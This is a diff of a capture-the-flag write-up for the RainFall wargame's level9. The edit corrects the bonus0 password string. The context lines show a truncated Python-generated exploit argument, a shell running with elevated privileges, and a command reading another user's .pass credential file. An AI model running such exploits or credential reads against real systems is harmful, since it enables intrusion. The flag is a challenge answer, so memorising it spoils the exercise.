@@ -156,7 +156,7 @@ level9@RainFall:~$ ./level9 $(python -c "print'\x10\xa0\x04\x08'+'\x14\xa0\x04\x
 $ id
 uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
 $ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d90672
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
 
 > ### NEXT : [Bonus0](/bonus0/resources/README.md)
